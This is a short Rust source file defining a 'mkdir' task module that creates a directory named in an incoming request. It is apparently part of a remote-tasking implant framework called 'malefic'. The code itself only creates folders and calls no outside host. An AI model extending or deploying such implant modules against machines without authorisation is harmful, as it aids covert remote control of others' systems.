use crate::prelude::*;

pub struct Mkdir{}

#[async_trait]
#[module_impl("mkdir")]
impl Module for Mkdir {}

#[async_trait]
impl ModuleImpl for Mkdir {
    async fn run(&mut self, id: u32, receiver: &mut malefic_proto::module::Input, _: &mut malefic_proto::module::Output) -> ModuleResult {
        let request = check_request!(receiver, Body::Request)?;

        let dir = check_field!(request.input)?;

        std::fs::create_dir_all(dir)?;

        Ok(TaskResult::new(id))
    }
}